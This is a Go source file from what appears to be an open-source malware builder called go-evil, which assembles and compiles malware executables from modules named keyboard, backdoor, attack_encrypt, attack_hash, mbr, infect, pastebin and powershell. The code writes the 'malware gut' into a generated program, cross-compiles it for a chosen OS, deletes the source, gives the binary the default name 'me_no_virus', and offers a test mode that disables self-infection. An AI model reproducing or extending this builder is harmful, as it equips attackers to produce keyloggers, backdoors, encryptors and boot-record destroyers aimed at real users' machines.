package io

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	mal "github.com/s9rA16Bf4/go-evil/domains/malware"
	"github.com/s9rA16Bf4/go-evil/utility/json"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
	"gopkg.in/go-rillas/subprocess.v1"
)

var debug bool = false // If this is true, then we will save the go-file that we compile
var test_mode string   // Will make the for loop run once, independant if an exit statement exists

const (
	sys            = "\tsys \"github.com/s9rA16Bf4/go-evil/domains/system\""
	win            = "\twin \"github.com/s9rA16Bf4/go-evil/domains/window\""
	time           = "\ttime \"github.com/s9rA16Bf4/go-evil/domains/time\""
	keyboard       = "\tkeyboard \"github.com/s9rA16Bf4/go-evil/domains/keyboard\""
	attack_hash    = "\tattack_hash \"github.com/s9rA16Bf4/go-evil/domains/attack_vector/hash\""
	attack_encrypt = "\tattack_encrypt \"github.com/s9rA16Bf4/go-evil/domains/attack_vector/encrypt\""
	back           = "\tback \"github.com/s9rA16Bf4/go-evil/domains/backdoor\""
	syscall        = "\"syscall\""
	net            = "\tnet \"github.com/s9rA16Bf4/go-evil/domains/network\""
	pwsh           = "\tpwsh \"github.com/s9rA16Bf4/go-evil/domains/powershell\""
	pastebin       = "\tpastebin \"github.com/s9rA16Bf4/go-evil/domains/pastebin\""
	mbr            = "\tmbr \"github.com/s9rA16Bf4/go-evil/domains/mbr\""
	infect         = "\tinfect \"github.com/s9rA16Bf4/go-evil/domains/infect\""

	// Related to webview
	loader_x86 = "https://github.com/webview/webview/raw/master/dll/x86/WebView2Loader.dll"
	view_x86   = "https://github.com/webview/webview/raw/master/dll/x86/webview.dll"
	loader_x64 = "https://github.com/webview/webview/raw/master/dll/x64/WebView2Loader.dll"
	view_x64   = "https://github.com/webview/webview/raw/master/dll/x64/webview.dll"

	// Variables
	run = "\truntime \"github.com/s9rA16Bf4/go-evil/utility/variables/runtime\""
)

func Append_domain(domain string, base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("io.Append_domain()")

	switch domain {
	case "system":
		notify.Log("Adding domain 'system'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(sys)

	case "window":
		notify.Log("Adding domain 'window'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(win)

	case "time":
		notify.Log("Adding domain 'time'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(time)

	case "keyboard":
		notify.Log("Adding domain 'keyboard'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(keyboard)

	case "attack_hash":
		notify.Log("Adding domain 'attack_hash'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(attack_hash)

	case "attack_encrypt":
		notify.Log("Adding domain 'attack_encrypt'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(attack_encrypt)

	case "backdoor":
		notify.Log("Adding domain 'backdoor'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(back)

	case "syscall":
		notify.Log("Adding library 'syscall'", notify.Verbose_lvl, "2")
		data_structure.Append_imported_domain(syscall)

	case "network":
		notify.Log("Adding domain 'network'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(net)

	case "powershell":
		notify.Log("Adding domain 'powershell'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(pwsh)

	case "pastebin":
		notify.Log("Adding domain 'pastebin'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(pastebin)

	case "mbr":
		notify.Log("Adding library 'MBR'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(mbr)

	case "infect":
		notify.Log("Adding library 'infect'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(infect)

	case "runtime":
		notify.Log("Adding library 'runtime'", data_structure.Verbose_LVL, "2")
		data_structure.Append_imported_domain(run)
	}

	return json.Send(data_structure)
}

func Set_target_OS(new_os string) {
	notify.Log("Updating target os, "+new_os, notify.Verbose_lvl, "2")
	os.Setenv("GOOS", new_os)

}
func Set_target_ARCH(new_arch string) {
	notify.Log("Updating target architecture, "+new_arch, notify.Verbose_lvl, "2")
	os.Setenv("GOARCH", new_arch)
}

func Set_testMode(new_mode bool, base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("io.Set_testMode()")

	if new_mode {
		test_mode = "i := 0; i < 1; i++"
		data_structure = json.Receive(mal.Disable_domain("win", json.Send(data_structure)))      // Window domain
		data_structure = json.Receive(mal.Disable_domain("time", json.Send(data_structure)))     // Time management domain
		data_structure = json.Receive(mal.Disable_domain("sys", json.Send(data_structure)))      // System domain
		data_structure = json.Receive(mal.Disable_domain("back", json.Send(data_structure)))     // Backdoor
		data_structure = json.Receive(mal.Disable_domain("keyboard", json.Send(data_structure))) // Keyboard
		data_structure = json.Receive(mal.Disable_domain("pastebin", json.Send(data_structure))) // pastebin
		data_structure = json.Receive(mal.Disable_domain("mbr", json.Send(data_structure)))      // Master boot record
		data_structure = json.Receive(mal.Disable_domain("infect", json.Send(data_structure)))   // We don't wanna infect ourself
	}

	return json.Send(data_structure)
}

func Write_file(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("io.Write_file()")

	base_code := []string{
		"package main",
		"import (",
		"\"github.com/cloudfoundry/jibber_jabber\"",
	}

	base_code = append(base_code, data_structure.Get_imported_domain()...) // Which domains to include
	base_code = append(base_code, ")", "func main(){")                     // Main function and closing include tag

	regions, base_64_serialize_json := mal.Region_is_disabled(json.Send(data_structure)) // Get all disabled regions
	data_structure = json.Receive(base_64_serialize_json)

	base_code = append(base_code, regions...)                          // Will stop the malware from running if it has been told too
	base_code = append(base_code, "for "+test_mode+" {")               // While loop
	base_code = append(base_code, data_structure.Get_malware_gut()...) // Insert the malware code
	base_code = append(base_code, "}}")                                // And insert the end

	if data_structure.Get_binary_name() == "" {
		data_structure.Set_binary_name("me_no_virus")
	}

	file, _ := os.Create("output/temp.go") // We utilize a temp directory
	write := bufio.NewWriter(file)

	for _, line := range base_code {
		notify.Log(fmt.Sprintf("Writing line '%s' to the target file", line), data_structure.Verbose_LVL, "3")
		_, err := write.WriteString(line + "\n")
		if err != nil {
			notify.Error("Failed to write to disk", "io.write_file()")
			//return
		}
	}
	write.Flush()

	return json.Send(data_structure)
}

func Read_file(file string) string {
	file_gut, err := ioutil.ReadFile(file)
	if err != nil {
		notify.Error(err.Error(), "io.read_file()")
		return ""
	}
	return string(file_gut)
}

func Compile_file(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("io.Compile_file()")

	if os.Getenv("GOOS") == "windows" && data_structure.Get_Extension() == "" {
		data_structure.Set_Extension(".exe") // Apparently golang on windows doesn't do this automatically
		notify.Log("Setting .exe extension on the target file", data_structure.Verbose_LVL, "3")
	}

	arg := fmt.Sprintf("build -o output/%s%s output/temp.go", data_structure.Get_binary_name(), data_structure.Get_Extension())
	cmd := exec.Command("go", strings.Split(arg, " ")...)
	notify.Log("Compiling malware", data_structure.Verbose_LVL, "1")

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()

	if err != nil {
		notify.Error(fmt.Sprint(err)+": "+stderr.String(), "io.compile_file()")
		//return
	}

	if !debug {
		notify.Log("Removing the temoporarly made golang file", data_structure.Verbose_LVL, "2")
		arg = "output/temp.go"
		cmd = exec.Command("rm", strings.Split(arg, " ")...)
		err := cmd.Run()

		if err != nil {
			notify.Error(fmt.Sprint(err)+": "+stderr.String(), "io.compile_file()")
			//return
		}
	}
	create_dll() // Creates only if necessary to the somewhat required dll files (only on windows)

	return json.Send(data_structure)
}

func create_dll() {
	if runtime.GOOS == "windows" { // Only required on windows, seems like most posix systems has this already included
		_, err := os.Stat("output/WebView2Loader.dll")
		if err != nil {
			notify.Log("Creating DLL file 'WebView2Loader.dll'", notify.Verbose_lvl, "2")
			create_WebView2Loader()
		}
		_, err = os.Stat("output/webview.dll")
		if err != nil {
			notify.Log("Creating DLL file 'webView.dll'", notify.Verbose_lvl, "2")
			create_webView()
		}
	}
}
func create_webView() {
	target := ""
	if os.Getenv("GOARCH") == "x64" {
		target = view_x64
	} else {
		target = view_x86
	}
	notify.Log("Downloading 'webView.dll'", notify.Verbose_lvl, "3")
	response, err := http.Get(target)
	if err != nil {
		notify.Error(err.Error(), "io.create_webView()")
		return
	}
	out, err := os.Create("output/webView.dll")
	if err != nil {
		notify.Error(err.Error(), "io.create_webView()")
		return
	}

	_, err = io.Copy(out, response.Body)
	if err != nil {
		notify.Error(err.Error(), "io.create_webView()")
		return
	}
}
func create_WebView2Loader() {
	target := ""
	if os.Getenv("GOARCH") == "x64" {
		target = loader_x64
	} else {
		target = loader_x86
	}
	notify.Log("Downloading 'WebView2Loader.dll'", notify.Verbose_lvl, "3")
	response, err := http.Get(target)
	if err != nil {
		notify.Error(err.Error(), "io.create_WebView2Loader()")
		return
	}
	out, err := os.Create("output/WebView2Loader.dll")
	if err != nil {
		notify.Error(err.Error(), "io.create_WebView2Loader()")
		return
	}

	_, err = io.Copy(out, response.Body)
	if err != nil {
		notify.Error(err.Error(), "io.create_WebView2Loader()")
		return
	}
}

func Create_file(file_name string, gut []string) {
	file, err := os.Create(file_name)
	if err != nil {
		notify.Error(err.Error(), "io.Create_file()")
		return
	}
	write := bufio.NewWriter(file)
	for _, line := range gut {
		write.WriteString(line + "\n")
	}
	write.Flush()
}

func Run_file(file_path string) string {
	resp := subprocess.RunShell("", "", file_path)
	return resp.StdOut
}

func Remove_file(file_path string) {
	os.Remove(file_path)
}
